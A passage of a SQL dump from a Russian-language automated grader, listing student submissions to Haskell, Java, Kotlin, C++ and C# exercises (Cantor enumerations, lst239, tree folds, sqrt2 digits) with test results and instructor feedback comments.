(2746, 68, 'hasp', '2012-10-27 14:08:59', 1, '/**\r\n * Задачка была отправлена на почту \r\n */\r\nimport java.util.ArrayList\r\nimport java.util.Arrays\r\n\r\nfun <E, T> ArrayList<E>.myMap(mapper: (E) -> T): ArrayList<T> {\r\n    val myList = ArrayList<T>(this.size())\r\n    for (e in this) myList.add(mapper(e))\r\n    return myList\r\n}\r\n\r\nfun <E> ArrayList<E>.filter(p: (E) -> Boolean): ArrayList<E> {\r\n    val myList = ArrayList<E>(this.size())\r\n    for (e in this) if (p(e)) myList.add(e)\r\n    myList.trimToSize()\r\n    return myList\r\n}\r\n\r\nfun zeroDigits(list: ArrayList<Int>, n: Int): ArrayList<Int> {\r\n    val stub = Math.pow(10.0, n + 0.0).toInt()\r\n    return list.myMap({i -> i/stub*stub})\r\n}\r\n\r\nfun main(args: Array<String>) {\r\n    val list = ArrayList<Int>(Arrays.asList(563, 5643, 76796))\r\n    println(zeroDigits(list, 2) )\r\n}', '<br/>Тесты успешно пройдены!'),
(2747, 67, 'hasp', '2012-10-27 14:11:37', 1, '/**\r\n * Задачка была отправлена на почту\r\n */\r\npublic class Task_16_2 {\r\n    static class MyList<E> extends ArrayList<E> {\r\n        MyList(int ic) { super(ic); }\r\n        MyList(Collection<? extends E> c) { super(c); }\r\n\r\n        abstract class Mapper<T> { abstract T apply(E e); }\r\n        abstract class Predicate { abstract boolean satisfy(E e); }\r\n\r\n        <T> MyList<T> transform(Mapper<T> map) {\r\n            MyList<T> myList = new MyList<T>(size());\r\n            for (E e : this) myList.add(map.apply(e));\r\n            return myList;\r\n        }\r\n\r\n        MyList<E> filter(Predicate p) {\r\n            MyList<E> myList = new MyList<E>(size());\r\n            for (E e : this) if (p.satisfy(e)) myList.add(e);\r\n            myList.trimToSize();\r\n            return myList;\r\n        }\r\n    }\r\n\r\n\r\n    static MyList<Integer> zeroDigits(MyList<Integer> list, final int n) {\r\n        final int stub = (int) Math.pow(10.0, n + 0.0);\r\n        ', '<br/>Тесты успешно пройдены!'),
(2748, 65, '82873297', '2012-10-27 16:34:44', 1, 'cantor = [(x,y) | x<-[1..],y<-[1..x]]\r\n', '<br/>Тесты успешно пройдены!'),
(2749, 66, '82873297', '2012-10-27 16:35:04', 0, 'generalizedCantor n = generalizedCantor2 n n\r\n\n\r\n\ngeneralizedCantor1 1 s _ = [[s]]\r\n\ngeneralizedCantor1 n s m = [x:xs | x<-[m..(s-n+1)], xs<-(generalizedCantor1 (n-1) (s-x) x), (n-1)*x<=(s-x)]\r\n\n\r\n\ngeneralizedCantor2 n s = (generalizedCantor1 n s 1) ++ (generalizedCantor2 n (s+1))\n', 'Выражение имеет неправильное значение: length(filter(==[2,1,2])(take 100 (generalizedCantor 3)))'),
(2750, 66, '82873297', '2012-10-27 16:57:34', 0, '﻿generalizedCantor n = generalizedCantor2 n n\r\n\n\r\n\ngeneralizedCantor1 1 s = [[s]]\r\n\ngeneralizedCantor1 n s = [x:xs | x<-[1..(s-n+1)], xs<-(generalizedCantor1 (n-1) (s-x))]\r\n\n\r\n\ngeneralizedCantor2 n s = (generalizedCantor1 n s) ++ (generalizedCantor2 n (s+1))\r\n\n\r\n\n-- Сначала условие понял по-другому. В первом варианте списки [2,1,2] и [1,2,2] были одним и тем же.\n', 'Не удалось вычислить выражение "length(filter(==[2,1,2])(take 100 (generalizedCantor 3)))", проверьте правильность синтаксиса'),
(2751, 66, '82873297', '2012-10-27 16:59:48', 0, '﻿generalizedCantor n = generalizedCantor2 n n\r\n\n\r\n\ngeneralizedCantor1 1 s = [[s]]\r\n\ngeneralizedCantor1 n s = [x:xs | x<-[1..(s-n+1)], xs<-(generalizedCantor1 (n-1) (s-x))]\r\n\n\r\n\ngeneralizedCantor2 n s = (generalizedCantor1 n s) ++ (generalizedCantor2 n (s+1))\n', 'Не удалось вычислить выражение "length(filter(==[2,1,2])(take 100 (generalizedCantor 3)))", проверьте правильность синтаксиса'),
(2752, 66, '82873297', '2012-10-27 17:01:46', 1, 'generalizedCantor n = generalizedCantor2 n n\r\n\r\n\r\n\r\ngeneralizedCantor1 1 s = [[s]]\r\n\r\ngeneralizedCantor1 n s = [x:xs | x<-[1..(s-n+1)], xs<-(generalizedCantor1 (n-1) (s-x))]\r\n\r\n\r\n\r\ngeneralizedCantor2 n s = (generalizedCantor1 n s) ++ (generalizedCantor2 n (s+1))\r\n', '<br/>Тесты успешно пройдены!'),
(2753, 74, '82873297', '2012-10-27 18:15:28', 1, 'data Tree= Empty | Node Integer Tree Tree\r\n\r\n\r\n\r\nfoldTree f e Empty = e\r\n\r\nfoldTree f e (Node x l r) = let lres = foldTree f e l\r\n\r\n                                rres = foldTree f e r \r\n\r\n                                in f x lres rres\r\n\r\n\r\n\r\nsumPos t = foldTree (x t1 t2 -> if x>0 then x+t1+t2 else t1+t2) 0 t\r\n', '<br/>Тесты успешно пройдены!'),
(2754, 72, '442421', '2012-10-27 18:43:52', 1, 'weekendExpences x = sum (zipWith (*) x (cycle [0,0,0,0,0,1,1]))', '<br/>Тесты успешно пройдены!'),
(2755, 79, 'hasp', '2012-10-27 20:17:48', 1, '/** Задача была отправлена на почту*/\r\npublic class Task_19_1_2 {\r\n    static class IntPair {\r\n        final int _1;\r\n        final int _2;\r\n\r\n        IntPair(int _1, int _2) {\r\n            this._1 = _1;\r\n            this._2 = _2;\r\n        }\r\n\r\n        public String toString() {\r\n            return "{" + _1 + ", " + _2 + "}";\r\n        }\r\n    }\r\n\r\n    abstract static class InfIterator<E> implements Iterator<E> {\r\n        protected E acc;\r\n\r\n        protected InfIterator(E acc) { this.acc = acc; }\r\n\r\n        protected InfIterator() {}\r\n\r\n        public void remove() { throw new UnsupportedOperationException(); }\r\n        public boolean hasNext() { return true; }\r\n    }\r\n}', '<br/>Тесты успешно пройдены!'),
(2756, 80, 'hasp', '2012-10-27 20:18:26', 1, '/** Задача была отправлена на почту*/ \r\npublic class Task_19_1_2 {\r\n    static class IntPair {\r\n        final int _1;\r\n        final int _2;\r\n\r\n        IntPair(int _1, int _2) {\r\n            this._1 = _1;\r\n            this._2 = _2;\r\n        }\r\n\r\n        public String toString() {\r\n            return "{" + _1 + ", " + _2 + "}";\r\n        }\r\n    }\r\n\r\n    abstract static class InfIterator<E> implements Iterator<E> {\r\n        protected E acc;\r\n\r\n        protected InfIterator(E acc) { this.acc = acc; }\r\n\r\n        protected InfIterator() {}\r\n\r\n        public void remove() { throw new UnsupportedOperationException(); }\r\n        public boolean hasNext() { return true; }\r\n    }}', '<br/>Тесты успешно пройдены!'),
(2757, 81, '517309', '2012-10-28 06:35:05', 0, 'lst239 = [2,3,9] ++ [a+10*b|b<-lst239, b<-[2,3,9]]', 'Не удалось вычислить выражение "take 15 lst239", проверьте правильность синтаксиса'),
(2758, 81, '517309', '2012-10-28 06:36:28', 1, 'lst239 = [2,3,9] ++ [a+10*b|b<-lst239,a<-[2,3,9]]', '<br/>Тесты успешно пройдены!'),
(2759, 82, '517309', '2012-10-28 06:37:18', 0, 'countDifferentVars a b = length a', 'Не удалось вычислить выражение "countDifferentVars [("x","y")] ["x"]", проверьте правильность синтаксиса'),
(2760, 82, '517309', '2012-10-28 06:38:12', 0, 'countDifferentVars a b = 1', 'Не удалось вычислить выражение "countDifferentVars [("x","y")] ["x"]", проверьте правильность синтаксиса'),
(2761, 82, '517309', '2012-10-28 06:41:46', 0, 'countDifferentVars x y = 1', 'Не удалось вычислить выражение "countDifferentVars [("x","y"),("y","z"))] ["x","w","y","z","x"]", проверьте правильность синтаксиса'),
(2762, 82, '517309', '2012-10-28 06:47:53', 0, 'countDifferentVars a b = length a', 'Не удалось вычислить выражение "countDifferentVars [(1,1),(2,3))] [1,4,2,3,1]", проверьте правильность синтаксиса'),
(2763, 82, '517309', '2012-10-28 06:50:46', 0, 'countDifferentVars a c = length a', 'Не удалось вычислить выражение "countDifferentVars [("x1","x3"),("x2","x3")] ["x1","x4","x2","x3","x1"]", проверьте правильность синтаксиса'),
(2764, 82, '517309', '2012-10-28 07:17:30', 0, 'countDifferentVars a c = length a', 'Выражение имеет неправильное значение: countDifferentVars [(1,2),(2,1)] [1,2,3]'),
(2765, 82, '517309', '2012-10-28 07:19:36', 0, 'countDifferentVars a c = length a', 'Хитрый тест номер 5 не пройден :(<br/>Подсказка: Списки могут быть и пустыми..'),
(2766, 82, '517309', '2012-10-28 07:20:34', 0, 'countDifferentVars a c = if a == [] || c == [] then 0 else length a', 'Хитрый тест номер 5 не пройден :(<br/>Подсказка: Списки могут быть и пустыми..'),
(2767, 82, '517309', '2012-10-28 07:21:33', 3, 'countDifferentVars a c = if a == [] then length c else if c == [] then 0 else length a', '<br/>Тесты успешно пройдены!'),
(2768, 82, '517309', '2012-10-28 07:30:07', 0, 'countDifferentVars [("x","y"),("y","z"), ("n","m")] ["x","w","y","z","x","n","m"] = 3\r\ncountDifferentVars x y = length x ', 'Не удалось вычислить выражение "countDifferentVars [(1,3),(2,3)] [1,4,2,3,1]", проверьте правильность синтаксиса'),
(2769, 82, '517309', '2012-10-28 07:31:18', 0, 'countDifferentVars [("x","y"),("y","z"), ("n","m")] ["x","w","y","z","x","n","m"] = 3\r\ncountDifferentVars a b = 1', 'Не удалось вычислить выражение "countDifferentVars [(1,3),(2,3)] [1,4,2,3,1]", проверьте правильность синтаксиса'),
(2770, 82, '517309', '2012-10-28 07:31:55', 0, 'countDifferentVars a b = length a', 'Хитрый тест номер 5 не пройден :(<br/>Подсказка: Списки могут быть и пустыми..'),
(2771, 82, '517309', '2012-10-28 07:33:27', 0, 'countDifferentVars [("x","y")] [] = 0\r\ncountDifferentVars a b = length a ', 'Не удалось вычислить выражение "countDifferentVars [(1,3),(2,3)] [1,4,2,3,1]", проверьте правильность синтаксиса'),
(2772, 82, '517309', '2012-10-28 07:34:47', 2, 'countDifferentVars [([''x''],[''y''])] [] = 0\r\ncountDifferentVars a b = length a ', 'Не удалось вычислить выражение "countDifferentVars [(1,3),(2,3)] [1,4,2,3,1]", проверьте правильность синтаксиса'),
(2773, 81, '44060', '2012-10-28 09:14:57', 1, 'lst239 = [x | x<-[1..], check x]\r\n		where\r\n			check 0 = True\r\n			check x = let a = x `mod` 10 ; y = x `div` 10 in \r\n						if a == 2 || a == 3 || a == 9 then check y else False', '<br/>Тесты успешно пройдены!'),
(2774, 66, '397095', '2012-10-28 09:29:23', 1, 'generalizedCantor n = foldr (++) [] (map (s -> gen n s) [3..])\r\n\r\ngen 1 s = [[s]]\r\ngen n s = [(x:xs) | x <- [1..(s-n+1)], xs <- gen (n - 1) (s - x)]', '<br/>Тесты успешно пройдены!'),
(2775, 74, '44060', '2012-10-28 09:30:31', 1, 'data Tree t = Node t (Tree t) (Tree t) | Empty\r\n\r\nfoldTree i j Empty = 0\r\nfoldTree i j ( Node a left right ) = let rezult1 = foldTree i j left; rezult2 = foldTree i j right\r\n										in i a rezult1 rezult2\r\n\r\nsum1 x1 x2 x3 = if x1 <= 0 then x2 + x3\r\n	else x1 + x2 + x3\r\n\r\nsumPos t = foldTree (sum1) 0 t', '<br/>Тесты успешно пройдены!'),
(2776, 81, 'alexey.solovyew@gmail.com', '2012-10-28 09:31:34', 0, 'countDifferentVars a b = length a', 'Не удалось вычислить выражение "take 15 lst239", проверьте правильность синтаксиса'),
(2777, 81, 'alexey.solovyew@gmail.com', '2012-10-28 09:35:59', 0, 'countDifferentVars a b = length a', 'Не удалось вычислить выражение "take 15 lst239", проверьте правильность синтаксиса'),
(2778, 81, 'alexey.solovyew@gmail.com', '2012-10-28 09:37:44', 2, 'countDifferentVars a b = length a', 'Выражение имеет неправильное значение: take 15 lst239'),
(2779, 82, 'alexey.solovyew@gmail.com', '2012-10-28 09:38:12', 0, 'countDifferentVars a b = length a', 'Выражение имеет неправильное значение: countDifferentVars [(["x","y")] ["x"]'),
(2780, 82, 'alexey.solovyew@gmail.com', '2012-10-28 09:38:33', 0, 'countDifferentVars a b = length a', 'Выражение имеет неправильное значение: countDifferentVars [(["x","y")] ["x"]'),
(2781, 82, 'alexey.solovyew@gmail.com', '2012-10-28 09:38:49', 0, 'countDifferentVars a b = length b', 'Выражение имеет неправильное значение: countDifferentVars [(["x","y")] ["x"]'),
(2782, 82, 'alexey.solovyew@gmail.com', '2012-10-28 09:39:53', 0, 'countDifferentVars a b = length a', 'Выражение имеет неправильное значение: countDifferentVars [(["x","y")] ["x"]'),
(2783, 82, 'alexey.solovyew@gmail.com', '2012-10-28 09:40:39', 2, 'countDifferentVars a b = length a', 'Выражение имеет неправильное значение: countDifferentVars [(["x","y")] ["x"]'),
(2784, 82, 'alexey.solovyew@gmail.com', '2012-10-28 09:53:30', 0, 'countDifferentVars a b = length a', 'Выражение имеет неправильное значение: countDifferentVars [(["x","y")] ["x"]'),
(2785, 82, 'alexey.solovyew@gmail.com', '2012-10-28 09:54:48', 2, 'countDifferentVars a b = length a', 'Выражение имеет неправильное значение: countDifferentVars [("x","y")] ["x"]'),
(2786, 75, '550896', '2012-10-28 10:33:27', 1, 'foldr: (a -> b -> b) -> b -> [a] -> b\r\nfoldr f z []     = z \r\nfoldr f z (x:xs) = f x (foldr f z xs) \r\n\r\nСначала построим предположений:\r\nfoldr: a -> b -> c -> d\r\nf: e -> m -> g\r\nz: h\r\nx: k\r\nxs: [k]\r\n\r\n1)Тип f = e -> m -> g, тип первого аргумента функции foldr = a. Ф-ция foldr применима к f \r\n=> a = e -> m -> g\r\n2) Тип z = h, тип (foldr f) = b -> c -> d, ф-ция (foldr f) применима к z \r\n=> b = h\r\n3) Тип второго аргумента foldr = b, тип (foldr f z []) = d, ф-я foldr может возвращать значение своего второго аргумента\r\n=> b = d\r\n4) Тип (x:xs) = [k] (т.к. тип x = k, а (x:xs) - это список)\r\n=> c = [k]\r\n5) Тип ф-и f = e -> m -> g, тип x = k, ф-я f применима к x \r\n=> e = k\r\n6) Тип ф-и (f x) = m -> g, тип (foldr f z xs) = d, ф-я (f x) применима к (foldr f z xs) \r\n=> m = d\r\n7) Тип ф-и (f x _) = g, тип ф-и (foldr _ _ _) = d, ф-я foldr может возвращать (f _ _)\r\n=> g = d\r\n\r\na -> b -> c -> d = \r\n(e -> m -> g) -> b -> [k] -> b = \r\n(e -> d -> d) -> b -> [e] -> b\r\n(e -> b -> b) -> b -> [e] -> b', '<br/>Тесты успешно пройдены!'),
(2787, 67, '383483', '2012-10-28 10:39:15', 1, '#include "stdafx.h"\r\n#include <iostream>\r\n#include <algorithm>\r\n\r\nusing namespace System;\r\nusing namespace std;\r\n\r\n#define SIZE 10\r\n\r\nint* zeroDigits(int a[], int _size, int n)\r\n{\r\n	int res_n = 10;\r\n	for (int i=0;i<n-1;i++)\r\n		res_n=res_n*10;\r\n	int* b = new int[SIZE];\r\n	int* c = new int[SIZE];\r\n	transform(a,a+_size, b, [res_n] (int i) {return (int)(i/res_n); });\r\n	transform(b,b+_size, c, [res_n] (int i) {return (int)(i*res_n); });\r\n   --- Можно было бы, на самом деле трансформировать прямо на месте, те transform(a, a+size, a, ...\r\n	return c;\r\n}\r\n\r\nint main()\r\n{\r\n	int a[SIZE]={12398,32796,53485,76052,34032,43111,6784,12363,13505, 98045};\r\n	for (int i=0;i<SIZE;i++)\r\n	{\r\n		cout<<a[i]<<" ";\r\n	}\r\n	cout<<''\r\n'';\r\n	int* b = zeroDigits(a,SIZE,3);\r\n	for (int i=0;i<SIZE;i++)\r\n	{\r\n		cout<<*b++<<" ";\r\n	}\r\n    return 0;\r\n}\r\n', '<br/>Тесты успешно пройдены!'),
(2788, 65, '4837959', '2012-10-28 11:54:33', 0, 'cantor = [(i, sum - i) | sum <- [2..], i <- [1..sum - 1]]', 'Выражение имеет неправильное значение: length(filter(==(3,2))(take 100 cantor))'),
(2789, 65, '4837959', '2012-10-28 11:56:56', 1, 'cantor = [(i, sum - i) | sum <- [2..], i <- [1..sum - 1]]\r\n\r\n\r\n', 'Выражение имеет неправильное значение: length(filter(==(3,2))(take 100 cantor))'),
(2790, 81, 'Deutsche', '2012-10-28 12:06:30', 1, 'lst239 = lst239a [0] 0\r\nlst239a curs n = let \r\n			s = drop (length curs - 3^n) curs\r\n			s2 = map (x -> (2*10^n+x)) s\r\n			s3 = map (x -> (3*10^n+x)) s\r\n			s9 = map (x -> (9*10^n+x)) s\r\n			sn = s2++s3++s9\r\n		 in (sn++(lst239a sn (n+1)))', 'Выражение имеет неправильное значение: take 15 lst239'),
(2791, 72, '517309', '2012-10-28 12:27:15', 2, 'weekendExpences _ = 28', 'Выражение имеет неправильное значение: weekendExpences [3,1,4,12,3,5,17,6,7,7,8,18,5,1,3]'),
(2792, 81, '12206137', '2012-10-28 12:37:07', 1, 'lstNums = [2,3,9]\r\n\r\nlst239 = lstNums ++ (concat $ map (x -> map (+ x * 10) lstNums) lst239)\r\n   --- ОК, очень хорошо, но, кстати, то же короче можно записать с помощью list comprehension\r\n', 'Выражение имеет неправильное значение: take 15 lst239'),
(2793, 66, '4837959', '2012-10-28 12:56:46', 1, 'generalizedCantor n = generalizedCantor'' n 3\r\ngeneralizedCantor'' n sum = (generateDiagonal n sum) ++ (generalizedCantor'' n (sum + 1))\r\ngenerateDiagonal 1 sum = [[sum]]\r\ngenerateDiagonal n sum = foldr (++) [] [(map (xs -> (i:xs)) (generateDiagonal (n - 1) (sum - i))) | i <- [1..sum - 1]]\r\n  --- Просто как замечание, то же можно проще записать с помощью list comprehension c двумя генераторами..\r\n', 'Выражение имеет неправильное значение: length(filter(==[2,1,2])(take 100 (generalizedCantor 3)))'),
(2794, 77, '5772638', '2012-10-28 14:11:51', 2, '   --- Нет, это, вроде с математической точки зрения и правильно но считает, походе очень меделенно.\r\n   --- У меня лично за минуту напечаталось примерно знаков 20, а у меня в тестах, если бы они работали,\r\n   --- проверяется 100й знак. Боюсь, до него дело никогда, никогда не дойдет((\r\n   --- Но мне кажется это нетрудно исправить. У вас в conutFract при каждом вызове функцмя вызывает соама себя\r\n   --- два раза, ну и получается экспоненциальная сложность. Но в данном случае, с ней легко справиться,\r\n   --- например с помощью накапливающих параметров.\r\n   --- Как-то так:\r\n   ---   countFract n = countFract1 n (1,1) (3,2)\r\n   --- А в countFract1 мы на каждом шаге пересчитываем по двум парам следующую\r\n   --- Попробуйте исправить, скажем до среды включительно? Если будет не получаться, напишите, я подскажу. \r\n   --- См также замечание ниже\r\ncontFract 0= (1,1)\r\ncontFract 1= (3,2)\r\ncontFract n= (2* fst (contFract (n-1))+fst (contFract (n-2)),2* snd (contFract (n-1))+snd (contFract (n-2)))\r\n\r\nmySqr b = ((fst (contFract (b*2)))*(10^b))/snd( contFract (b*2))\r\n   --- Нет, так нельзя.. Как только вы разделите числитель на знаменатель, вы поолучитье Double в котором по \r\n   --- сути не может быть больше 15 правильных цифр, в нем такая точность. Но вам ведь и не надо Double..\r\n   --- Подсказка: вы можете числитель умножить на 10^n, разделить _нацело_ на знаменатель и взять последнюю цифру.\r\n\r\nsqrt2 = 1: [x|b<-[1..],x<-[mod (truncate(mySqr b)) 10 ]]', 'Выражение имеет неправильное значение: take 20 sqrt2'),
(2795, 66, '63706456', '2012-10-28 14:41:14', 1, 'generalizedCantor 1 = map (x->[x]) [0..]\r\ngeneralizedCantor n = [(x:ls) | upb <- [0..], \r\n				ls <- (takeWhile (xs -> sum xs <= upb) (generalizedCantor (n-1))), \r\n				let x = upb - sum ls]', 'Выражение имеет неправильное значение: length(filter(==[2,1,2])(take 100 (generalizedCantor 3)))'),
(2796, 81, '5772638', '2012-10-28 15:02:19', 1, 'lst239=2:3:9:[y|x<-lst239,y<-[x*10+2,x*10+3,x*10+9]]', 'Выражение имеет неправильное значение: take 15 lst239'),
(2797, 66, 'erwert', '2012-10-28 15:37:19', 0, 'cantor n\r\n	| n == 2 = [ [a, b] | i <- [1..], j <- [1..2*i-1], let a = if i >= j then i else j - i; b = if i >= j then j else i]\r\n	| otherwise = [ (a:b) |  b <- cantor (n - 1), a <- [1..mmax b]]', 'Выражение имеет неправильное значение: length(filter(==[2,1,2])(take 100 (generalizedCantor 3)))');
INSERT INTO `solution` (`SolutionID`, `TaskID`, `UserID`, `LoadTimestamp`, `ResultID`, `Code`, `TestResult`) VALUES
(2798, 66, 'erwert', '2012-10-28 15:37:51', 0, 'generalizedCantor n\r\n	| n == 2 = [ [a, b] | i <- [1..], j <- [1..2*i-1], let a = if i >= j then i else j - i; b = if i >= j then j else i]\r\n	| otherwise = [ (a:b) |  b <- cantor (n - 1), a <- [1..mmax b]]', 'Выражение имеет неправильное значение: length(filter(==[2,1,2])(take 100 (generalizedCantor 3)))'),
(2799, 66, 'erwert', '2012-10-28 15:38:10', 0, 'mmax l = foldl1 (a b -> if a > b then a else b) l\r\n\r\ngeneralizedCantor n\r\n	| n == 2 = [ [a, b] | i <- [1..], j <- [1..2*i-1], let a = if i >= j then i else j - i; b = if i >= j then j else i]\r\n	| otherwise = [ (a:b) |  b <- cantor (n - 1), a <- [1..mmax b]]', 'Выражение имеет неправильное значение: length(filter(==[2,1,2])(take 100 (generalizedCantor 3)))'),
(2800, 66, 'erwert', '2012-10-28 15:39:14', 0, 'mmax l = foldl1 (a b -> if a > b then a else b) l\r\n\r\ngeneralizedCantor n\r\n	| n == 2 = [ [a, b] | i <- [1..], j <- [1..2*i-1], let a = if i >= j then i else j - i; b = if i >= j then j else i]\r\n	| otherwise = [ (a:b) |  b <- generalizedCantor (n - 1), a <- [1..mmax b]]', 'Выражение имеет неправильное значение: length(filter(==[2,1,2])(take 100 (generalizedCantor 3)))'),
(2801, 66, 'erwert', '2012-10-28 15:44:14', 2, '-- length(filter(==[2,1,2])(take 100 (generalizedCantor 3)))\r\n-- выдаёт ответ 1 в hugs-e.\r\n-- полагаю, что тут идёт речь об ошибке компиляции.\r\n   --- Там действительно ошибка в системе, сегодня она на все выдает ошибки(((\r\n   --- Но у вас похоже не все правильно\r\n   --- Вот такой вызов\r\n   ---    filter (==[4,1,1]) $ take 100000 $ generalizedCantor 3\r\n   --- выдает [] - те похоже [4,1,1] у вас не включяется в список?\r\n   --- Попробуйте исправить, пожалуйста, скажем до вторника внлючительно\r\n\r\nmmax l = foldl1 (a b -> if a > b then a else b) l\r\ngeneralizedCantor n\r\n	| n == 2 = [ [a, b] | i <- [1..], j <- [1..2*i-1], let a = if i >= j then i else j - i; b = if i >= j then j else i]\r\n	| otherwise = [ (a:b) |  b <- generalizedCantor (n - 1), a <- [1..mmax b]]', 'Выражение имеет неправильное значение: length(filter(==[2,1,2])(take 100 (generalizedCantor 3)))'),
(2802, 65, '9539826', '2012-10-28 15:58:24', 1, 'cantor = [(x,y)|n<-[1..],x<-[1..n],y<-[1..n],x+y==n]', 'Выражение имеет неправильное значение: length(filter(==(3,2))(take 100 cantor))'),
(2803, 66, '9539826', '2012-10-28 16:37:58', 2, '  --- Нет, это не то.. Даже при n = 2, вы не сможете найти в вашем списке например пару \r\n  --- (попробуйте  filter (==[1,2]) (take 100000 (generalizedCantor 2))\r\ngeneralizedCantor 1 = [[x]|x<-[1..]]\r\ngeneralizedCantor n = [x:xs|xs<-generalizedCantor (n-1),x<-[1..]]', 'Выражение имеет неправильное значение: length(filter(==[2,1,2])(take 100 (generalizedCantor 3)))'),
(2804, 75, '5772638', '2012-10-28 17:01:59', 1, 'а. foldr :: (a -> b -> b) -> b -> [a] -> b\r\nб. foldr f e [] = e\r\n   foldr f e (x:xs) = f x (foldr f e xs)\r\n   1. ничего не знаем про аргументы а1->а2->а3->а4\r\n   2. уточняем: (x:xs)имеет тип а3 => a3=[a5]\r\n   3. применяем f  и имеем тип a1 => a1= a6->a7->a8\r\n   4. имеем (a6->a7->a8)->a2->[a5]->a4\r\n   5. докажем, что некоторые типы равны: \r\n      f x - результат f => a4=a8\r\n      x - аргумент f, x из (x:xs) => a6=a5\r\n      foldr f e xs имеет тип a4  и является аргументом f => a7=a4\r\n      e является результатом foldr и имеет тип a2 => a2=a4\r\n(a5->a4->a4)->a4->[a5]->a4\r\n      ', '<br/>Тесты успешно пройдены!'),
(2805, 81, '2118411', '2012-10-28 17:07:38', 1, 'lst239 = [2,3,9]++(foldr(++)[]$map(x->[x*10+2,x*10+3,x*10+9])lst239)\r\n', 'Выражение имеет неправильное значение: take 15 lst239'),
(2806, 65, '532002', '2012-10-28 17:25:11', 1, 'cantor = [(x,y)|t<-[1..],x<-[1..t],y<-[1..t],x+y==t]\r\n\r\n\r\n\r\n\r\n', 'Выражение имеет неправильное значение: length(filter(==(3,2))(take 100 cantor))'),
(2807, 81, 'tonyo', '2012-10-28 17:39:02', 1, 'cartProd xs ys = [ read (i ++ j) :: Int |\r\n                   x <- xs, y <- ys, let i = show x, let j = show y ] \r\n\r\nlst239 = 2:3:9 : cartProd lst239 [2,3,9]\r\n', 'Выражение имеет неправильное значение: take 15 lst239'),
(2808, 80, 'tonyo', '2012-10-28 17:40:49', 1, 'using System;\r\nusing System.Collections.Generic;\r\n\r\npublic class Pr19_2\r\n{\r\n\r\n  public class Pair\r\n  {\r\n    public int i;\r\n    public int j;\r\n\r\n    public Pair(int i, int j)\r\n    {   \r\n      this.i = i;  \r\n      this.j = j;\r\n    }   \r\n  }\r\n\r\n\r\n  public static IEnumerable<Pair> cantor()\r\n  {                                                                                                                                                                                                                                                                          \r\n    yield return new Pair(1, 1); \r\n    int n = 2;\r\n    while (true)\r\n    {   \r\n      for (int i = 1; i < n; i++)\r\n      {   \r\n        yield return new Pair(n, i); \r\n        yield return new Pair(i, n); \r\n      }   \r\n      yield return new Pair(n, n); \r\n      n += 1;\r\n    }   \r\n  }\r\n\r\n  public static void Main()\r\n  {\r\n    int i = 0;\r\n    foreach (Pair x in cantor())\r\n    {   \r\n      Console.WriteLine("{0} {1}", x.i, x.j);\r\n      if (i++ >= 20) \r\n        break;\r\n    }   \r\n  }\r\n}', '<br/>Тесты успешно пройдены!'),
(2809, 77, '5772638', '2012-10-28 17:45:58', 1, 'contFract 1 ft sd=(2* fst sd +fst ft ,2* snd sd+snd ft )\r\ncontFract n ft sd= contFract (n-1) sd (2* fst sd +fst ft ,2* snd sd+snd ft )\r\n  \r\nmySqr b =let p=contFract (b*2) (1,1) (3,2) in div ((fst p)*10^b) (snd p)\r\nsqrt2 = 1: [x|b<-[1..],x<-[mod (mySqr b) 10 ]]', 'Выражение имеет неправильное значение: take 20 sqrt2'),
(2810, 79, '517309', '2012-10-28 18:00:09', 2, 'test', '<br/>Тесты успешно пройдены!'),
(2811, 66, '532002', '2012-10-28 18:04:50', 1, 'allLists n k =  powerset1 k [1..n] where\r\n\r\npowerset1 0 xs = [[]]\r\n\r\npowerset1 k xs = [x:ys | x<-xs,ys<-powerset1 (k-1) xs,length ys == k-1] \r\n\r\n\r\n\r\ngeneralizedCantor n = [xs|t<-[1..],xs<-allLists t n,sum xs == t]\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n', 'Выражение имеет неправильное значение: length(filter(==[2,1,2])(take 100 (generalizedCantor 3)))'),
(2812, 76, '5772638', '2012-10-28 18:08:09', 1, 'data Circle = Circle Double\r\ndata Rect = Rect Double Double\r\nclass Shape where\r\nperimeter a::a-> Double\r\ninstance Shape Rect where\r\n   perimeter (Rect x y )= (x+y)*2\r\ninstance Shape Circle where\r\n   perimeter (Circle r )= 3.14*2*r\r\n', 'Выражение имеет неправильное значение: perimeter (Circle 0)'),
(2813, 66, '9539826', '2012-10-28 18:58:20', 1, 'generalizedCantor 1 = [[x]|x<-[1..]]\r\ngeneralizedCantor n = generalizedCantor1 n n\r\nlists 1 s= [[x]|x<-[1..s]]\r\nlists n s= [x:xs|xs<-lists (n-1) s,x<-[1..s]] \r\ngeneralizedCantor1 n s = [a| a <- lists n s, foldl (+) 0 a == s] ++ generalizedCantor1 n (s+1)', 'Выражение имеет неправильное значение: length(filter(==[2,1,2])(take 100 (generalizedCantor 3)))'),
(2814, 76, 'tonyo', '2012-10-28 19:00:44', 1, 'data Rect = Rect Double Double\r\ndata Circle = Circle Double\r\n\r\nclass Shape a where\r\n  perimeter :: a -> Double\r\n  area :: a -> Double\r\n\r\ninstance Shape Rect where\r\n  perimeter (Rect x y) = 2*(x+y)\r\n  area (Rect x y) = x*y\r\n\r\ninstance Shape Circle where\r\n  perimeter (Circle r) = 2*pi*r                                                                                                                                         \r\n  area (Circle r) = pi*r*r\r\n', 'Выражение имеет неправильное значение: perimeter (Circle 0)'),
(2815, 69, '1029771', '2012-10-28 19:02:06', 1, 'bigSin n =  head [x | x <- map(x -> sin(x))[1,2.. ], x > n] \r\n   --- ОК, но только n для вещественной переменной - неудачное имя..', 'Выражение имеет неправильное значение: (bigSin 0.99) < 0.991'),
(2816, 77, '533223', '2012-10-28 19:12:41', 2, '  --- Нет, так неправильно.. Как только вы написали sqrt 2, вы, тем самым, вычисляете\r\n  --- цифры не настоящего корня из двух, а его приближения в double. Те больше примерно 15 \r\n  --- правильных знаков вы точно не получите..\r\n  --- Это означает, что тут надо как-то свести эту задачу к вычислениям над целыми числами.\r\n  --- (мб очень длинными).\r\n  --- Это, на самом деле не очень сложно.\r\nsqrNumber k = floor (10 * (t - (fromIntegral (floor t))))\r\n		where t = (sqrt 2) * (10^(k-2))\r\n\r\nhelpList k = (sqrNumber k):helpList (k+1)\r\nsqrt2=1:(helpList 2)', 'Выражение имеет неправильное значение: take 20 sqrt2'),
